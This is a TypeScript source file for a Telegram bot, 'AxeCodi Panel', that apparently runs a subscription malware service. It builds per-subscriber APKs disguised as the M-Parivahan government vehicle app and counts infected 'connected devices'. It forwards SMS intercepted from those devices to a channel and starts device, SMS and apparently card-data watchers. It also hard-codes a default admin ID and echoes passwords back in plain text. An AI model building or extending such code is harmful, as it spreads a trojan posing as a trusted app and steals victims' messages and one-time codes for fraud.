import { Telegraf, Markup, Context } from "telegraf";
import { logger } from "../lib/logger";
import {
  getSubscription,
  getAllSubscriptions,
  setSubscription,
  deleteSubscription,
  isSubscriptionActive,
  fbGet,
  fbSet,
  fbUpdate,
  setPanelPassword,
  setAdminConfig,
  getSmsChannel,
  setSmsChannel,
  removeSmsChannel,
} from "./firebase";
import { startSmsWatcher } from "./smsWatcher";

// Tracks users mid-conversation (waiting for their next message)
const pendingActions = new Map<string, { action: "reset_password" | "set_email" }>();
import { buildUserApk, getApkSize, initApkTemplate, isTemplateReady } from "./apkBuilder";
import { startDeviceWatcher } from "./deviceWatcher";
import { startCcWatcher } from "./ccWatcher";

const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
const ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5741539104");

function getPanelUrl(): string {
  const custom = process.env["PANEL_URL"];
  if (custom) return custom.replace(/\/$/, "");
  const domain = process.env["REPLIT_DEV_DOMAIN"];
  if (domain) return `https://${domain}`;
  return "https://cyberzone.replit.app";
}

if (!BOT_TOKEN) {
  logger.warn("TELEGRAM_BOT_TOKEN not set — bot will not start");
}

function isAdmin(ctx: Context): boolean {
  return ctx.from?.id === ADMIN_ID;
}

function formatDate(ts: number): string {
  return new Date(ts).toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata",
    day: "2-digit",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  }) + " IST";
}

function daysToMs(days: number): number {
  return days * 24 * 60 * 60 * 1000;
}

let bot: Telegraf | null = null;

export function getBot(): Telegraf | null {
  return bot;
}

export async function startBot(): Promise<void> {
  if (!BOT_TOKEN) return;

  // Pre-decode APK template in background so /apk is ready instantly
  initApkTemplate().catch((err) =>
    logger.error({ err }, "APK template init failed")
  );

  bot = new Telegraf(BOT_TOKEN);

  // Global error handler — prevents unhandled rejections crashing the bot
  bot.catch(async (err: unknown, ctx: Context) => {
    logger.error({ err }, "Bot unhandled error");
    try {
      await ctx.reply("❌ An error occurred. Please try again or contact admin.");
    } catch {}
  });

  // ─── /start ──────────────────────────────────────────────────────────────
  bot.command("start", async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name || "User";

    if (isAdmin(ctx)) {
      const panelUrl = getPanelUrl();
      await ctx.reply(
        `*AxeCodi Panel — Admin Console*\n\n` +
        `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
        `*Available Commands:*\n` +
        `/start — Show this menu\n` +
        `/apk — Get mParivahan APK\n` +
        `/reset\\_password — Reset web panel password\n` +
        `/setpanel — Set panel email\n\n` +
        `*Admin Commands:*\n` +
        `/adduser — Add subscription\n` +
        `/removeuser — Remove subscription\n` +
        `/listusers — List all subscribers\n` +
        `/stats — System stats\n\n` +
        `🌐 *Panel:* ${panelUrl}`,
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("🌐 Open Web Panel", panelUrl)],
          ]),
        }
      );
      // Send keyboard separately so inline button + reply keyboard both show
      await ctx.reply(
        "Quick actions:",
        Markup.keyboard([
          ["📱 Get APK", "🔑 Reset Password"],
          ["👥 Users List", "📊 Stats"],
          ["🌐 Open Panel"],
        ]).resize()
      );
      return;
    }

    const sub = await getSubscription(userId);

    if (!sub) {
      await ctx.reply(
        `*AxeCodi Panel Bot*\n\n` +
        `❌ No subscription found for your account.\n\n` +
        `Contact admin to get access:\n@exoincs`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const now = Date.now();
    const isActive = sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
    const timeLeft = sub.expiresAt ? Math.max(0, sub.expiresAt - now) : 0;
    const daysLeft = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hoursLeft = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));

    const panelUrl = getPanelUrl();
    await ctx.reply(
      `📋 *Subscription Details*\n\n` +
      `• Account: ${username}\n` +
      `• Plan: ${sub.plan}\n` +
      `• Status: ${isActive ? "✅ Active" : "❌ Expired"}\n` +
      (sub.expiresAt ? `• Expires: ${formatDate(sub.expiresAt)}\n` : "") +
      (isActive && sub.expiresAt ? `• Time Left: ${daysLeft}d ${hoursLeft}h\n` : "") +
      `\n🌐 *Panel:* ${panelUrl}`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl)],
        ]),
      }
    );
    await ctx.reply(
      "Quick actions:",
      Markup.keyboard([
        ["📱 Get APK", "🔑 Reset Password"],
        ["🌐 Open Panel"],
      ]).resize()
    );
  });

  // ─── 🌐 Open Panel keyboard button ──────────────────────────────────────
  bot.hears("🌐 Open Panel", async (ctx) => {
    const panelUrl = getPanelUrl();
    await ctx.reply(
      `🌐 *Web Panel*\n\n${panelUrl}\n\nLogin with your email and password.\nNo password? Use /reset\\_password to set one.`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl)],
        ]),
      }
    );
  });

  // ─── /apk ────────────────────────────────────────────────────────────────
  bot.command("apk", handleApkCommand);
  bot.hears("📱 Get APK", handleApkCommand);

  async function handleApkCommand(ctx: Context) {
    try {
      const userId = ctx.from!.id.toString();
      const active = isAdmin(ctx) || await isSubscriptionActive(userId);

      if (!active) {
        await ctx.reply("❌ Your subscription is not active.\n\nContact @exoincs to get access.");
        return;
      }

      if (!isTemplateReady()) {
        await ctx.reply("⏳ APK system is initializing (first-time setup ~2 min). Please try again shortly.");
        return;
      }

      await ctx.reply("🔨 *Building your APK...*\nThis takes ~10 seconds.", { parse_mode: "Markdown" });
      await buildAndSendMparivahan(ctx);
    } catch (err) {
      logger.error({ err }, "handleApkCommand error");
      await ctx.reply("❌ APK build failed. Please try again later.");
    }
  }

  async function buildAndSendMparivahan(ctx: Context) {
    try {
      const userId = ctx.from!.id.toString();
      const apkPath = await buildUserApk(userId);
      if (!apkPath) {
        await ctx.reply("❌ APK build failed — template not ready. Contact admin.");
        return;
      }

      const size = getApkSize(apkPath);
      const buildId = Math.floor(Math.random() * 90000) + 10000;

      await ctx.reply(
        `🛠 *AXECODI BUILD CENTER*\n\n` +
        `📱 App: M-Parivahan\n` +
        `🆔 Build ID: #${buildId}\n` +
        `👤 Owner ID: \`${userId}\`\n\n` +
        `✅ Status: Ready!\n` +
        `📦 Size: ${size}\n\n` +
        `👇 APK sent below.`,
        { parse_mode: "Markdown" }
      );

      await ctx.replyWithDocument({ source: apkPath, filename: `mParivahan_AxeCodi.apk` });
    } catch (err: any) {
      logger.error({ err }, "buildAndSendMparivahan error");
      // Send actual error to admin so we can debug
      const errMsg = err?.message || String(err);
      try {
        await bot!.telegram.sendMessage(
          ADMIN_ID,
          `🔴 APK build error:\n\`${errMsg.slice(0, 500)}\``,
          { parse_mode: "Markdown" }
        );
      } catch {}
      await ctx.reply(`❌ APK build failed:\n\`${errMsg.slice(0, 300)}\``, { parse_mode: "Markdown" });
    }
  }

  // ─── /reset_password ─────────────────────────────────────────────────────
  bot.command("reset_password", handleResetPassword);
  bot.hears("🔑 Reset Password", handleResetPassword);

  async function handleResetPassword(ctx: Context) {
    const userId = ctx.from!.id.toString();
    const active = isAdmin(ctx) || await isSubscriptionActive(userId);

    if (!active) {
      await ctx.reply("❌ Subscription required.");
      return;
    }

    // Mark user as awaiting new password input
    pendingActions.set(userId, { action: "reset_password" });

    await ctx.reply(
      `🔑 *Password Reset*\n\nType your new panel password:\n\n_Only your account will be updated._`,
      { parse_mode: "Markdown" }
    );
  }

  // ─── Admin: /setpanel — admin apna email set kare ───────────────────────
  // Usage: /setpanel email@example.com
  bot.command("setpanel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const email = ctx.message.text.split(" ")[1]?.trim();
    if (!email || !email.includes("@")) {
      await ctx.reply(
        "Usage: `/setpanel email@example.com`\n\nThis sets your web panel login email.",
        { parse_mode: "Markdown" }
      );
      return;
    }

    await setAdminConfig({
      telegramId: ADMIN_ID.toString(),
      email,
      username: ctx.from.username || "Admin",
    });

    await ctx.reply(
      `✅ *Admin Panel Email Set!*\n\n` +
      `Email: \`${email}\`\n\n` +
      `Now use /reset\\_password to set your panel password.`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── /stats ──────────────────────────────────────────────────────────────
  bot.command("stats", async (ctx) => {
    if (!isAdmin(ctx)) return;

    const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter(
      (s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)
    ).length;

    await ctx.reply(
      `📊 *System Stats*\n\n` +
      `📱 Connected Devices: ${deviceCount}\n` +
      `👥 Total Subscribers: ${subCount}\n` +
      `✅ Active Subscriptions: ${activeSubs}`,
      { parse_mode: "Markdown" }
    );
  });

  bot.hears("📊 Stats", async (ctx) => {
    if (!isAdmin(ctx)) return;
    const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter(
      (s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)
    ).length;
    await ctx.reply(
      `📊 *System Stats*\n\n📱 Connected Devices: ${deviceCount}\n👥 Total Subscribers: ${subCount}\n✅ Active Subscriptions: ${activeSubs}`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /adduser ─────────────────────────────────────────────────────
  // Usage: /adduser 123456789 30 username email@example.com
  bot.command("adduser", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 2) {
      await ctx.reply(
        "Usage: `/adduser {telegramId} {days} {username} {email}`\n\nExample:\n`/adduser 123456789 30 @username user@email.com`\n\n_Email optional but required for web panel login._",
        { parse_mode: "Markdown" }
      );
      return;
    }

    const [telegramId, daysStr, username = "unknown", email] = parts;
    const days = parseInt(daysStr);

    if (isNaN(days) || days <= 0) {
      await ctx.reply("❌ Invalid days value.");
      return;
    }

    const existing = await getSubscription(telegramId);
    const now = Date.now();

    const baseTime = existing?.status === "active" && existing.expiresAt && existing.expiresAt > now
      ? existing.expiresAt
      : now;

    const expiresAt = baseTime + daysToMs(days);

    await setSubscription(telegramId, {
      telegramId,
      username: username.replace("@", ""),
      plan: `${days} Days`,
      status: "active",
      expiresAt,
      createdAt: existing?.createdAt || now,
      ...(email ? { email: email.toLowerCase() } : {}),
    } as any);

    const daysLeft = Math.floor((expiresAt - now) / (1000 * 60 * 60 * 24));

    await ctx.reply(
      `✅ *Subscription Added!*\n\n` +
      `👤 User: ${username}\n` +
      `🆔 ID: \`${telegramId}\`\n` +
      `📅 Plan: ${days} Days\n` +
      `⏰ Expires: ${formatDate(expiresAt)}\n` +
      `🕐 Days Left: ${daysLeft}d\n` +
      (email ? `📧 Email: ${email}` : `⚠️ No email set — user won't be able to login to panel`),
      { parse_mode: "Markdown" }
    );

    // Notify the user
    try {
      await bot!.telegram.sendMessage(
        parseInt(telegramId),
        `🎉 *Subscription Activated!*\n\n` +
        `Plan: ${days} Days\n` +
        `Expires: ${formatDate(expiresAt)}\n\n` +
        `📱 /apk — Download APK\n` +
        `🔑 /reset\\_password — Set your web panel password`,
        { parse_mode: "Markdown" }
      );
    } catch {
      await ctx.reply("⚠️ Could not notify user (they may not have started the bot yet).");
    }
  });

  // ─── Admin: /removeuser ──────────────────────────────────────────────────
  bot.command("removeuser", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const telegramId = ctx.message.text.split(" ")[1];
    if (!telegramId) {
      await ctx.reply("Usage: `/removeuser {telegramId}`", { parse_mode: "Markdown" });
      return;
    }

    const sub = await getSubscription(telegramId);
    if (!sub) {
      await ctx.reply("❌ User not found.");
      return;
    }

    await deleteSubscription(telegramId);
    await ctx.reply(`✅ Subscription removed for \`${telegramId}\` (${sub.username})`, {
      parse_mode: "Markdown",
    });
  });

  // ─── Admin: /listusers ───────────────────────────────────────────────────
  bot.command("listusers", handleListUsers);
  bot.hears("👥 Users List", handleListUsers);

  async function handleListUsers(ctx: Context) {
    if (!isAdmin(ctx)) return;

    const subs = await getAllSubscriptions();
    const entries = Object.entries(subs);

    if (entries.length === 0) {
      await ctx.reply("No subscribers yet.");
      return;
    }

    const now = Date.now();
    const lines = entries.map(([id, s]: [string, any]) => {
      const isActive = s.status === "active" && (!s.expiresAt || now < s.expiresAt);
      const daysLeft = s.expiresAt ? Math.floor((s.expiresAt - now) / (1000 * 60 * 60 * 24)) : "∞";
      return `${isActive ? "✅" : "❌"} \`${id}\` — @${s.username || "?"} — ${s.plan} — ${isActive ? `${daysLeft}d left` : "Expired"}`;
    });

    await ctx.reply(
      `👥 *All Subscribers (${entries.length})*\n\n${lines.join("\n")}`,
      { parse_mode: "Markdown" }
    );
  }

  // ─── Default text handler ────────────────────────────────────────────────
  bot.on("text", async (ctx) => {
    const userId = ctx.from.id.toString();
    const pending = pendingActions.get(userId);

    if (pending?.action === "reset_password") {
      pendingActions.delete(userId);
      const newPass = ctx.message.text.trim();

      if (newPass.length < 4) {
        await ctx.reply("❌ Password must be at least 4 characters. Try again: /reset_password");
        return;
      }

      await setPanelPassword(userId, newPass, isAdmin(ctx));

      await ctx.reply(
        `✅ *Password Successfully Changed!*\n\nYour new panel password:\n\`${newPass}\`\n\n_Only your account has been updated._`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await ctx.reply(
      "Use /start to see the menu.",
      Markup.keyboard([
        ["📱 Get APK", "🔑 Reset Password"],
        ["🌐 Open Panel"],
      ]).resize()
    );
  });

  // ─── Admin: /setchannel ──────────────────────────────────────────────────
  // Usage: /setchannel -100xxxxxxxxxx  OR  /setchannel @channelname
  bot.command("setchannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const channelId = ctx.message.text.split(" ")[1]?.trim();
    if (!channelId) {
      const current = await getSmsChannel();
      await ctx.reply(
        `📡 *SMS Forward Channel*\n\n` +
        `Current: ${current ? `\`${current}\`` : "Not set"}\n\n` +
        `Usage: \`/setchannel -100xxxxxxxxxx\`\n` +
        `Remove: \`/removechannel\`\n\n` +
        `_Make sure the bot is an admin of that channel first._`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await setSmsChannel(channelId);
    await ctx.reply(
      `✅ *SMS Channel Set!*\n\n` +
      `Channel ID: \`${channelId}\`\n\n` +
      `All new SMS from devices will be forwarded to this channel.\n\n` +
      `⚠️ Make sure the bot is an admin of the channel with permission to post messages.`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /removechannel ───────────────────────────────────────────────
  bot.command("removechannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    await removeSmsChannel();
    await ctx.reply("✅ SMS forwarding channel has been removed.");
  });

  // Launch bot first — only start watchers if THIS process owns the bot token.
  // If another process already claimed it (409), skip watchers to avoid duplicate alerts.
  bot.launch({ dropPendingUpdates: true }).then(() => {
    startDeviceWatcher(bot!, ADMIN_ID);
    startSmsWatcher(bot!, ADMIN_ID);
    startCcWatcher(bot!, ADMIN_ID);
    logger.info("Watchers started — this process owns the bot");
  }).catch((err: any) => {
    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
      logger.warn("Bot 409 conflict — another instance is running. Watchers NOT started in this process.");
    } else {
      logger.error({ err }, "Bot launch error");
      startDeviceWatcher(bot!, ADMIN_ID);
      startSmsWatcher(bot!, ADMIN_ID);
      startCcWatcher(bot!, ADMIN_ID);
    }
  });
  logger.info("Telegram bot started");

  // Warn admin if PANEL_URL is not set
  if (!process.env["PANEL_URL"]) {
    logger.warn("PANEL_URL env var not set — bot will use REPLIT_DEV_DOMAIN as fallback (not suitable for production)");
    try {
      await bot.telegram.sendMessage(
        ADMIN_ID,
        `⚠️ PANEL_URL is not set.\n\nAdd PANEL_URL in Replit env vars so /start shows the correct panel link.\n\nExample: PANEL_URL=https://your-domain.com`
      );
    } catch (err) {
      logger.warn({ err }, "Could not send PANEL_URL warning to admin");
    }
  }

  // Graceful shutdown
  process.once("SIGINT", () => bot!.stop("SIGINT"));
  process.once("SIGTERM", () => bot!.stop("SIGTERM"));
}
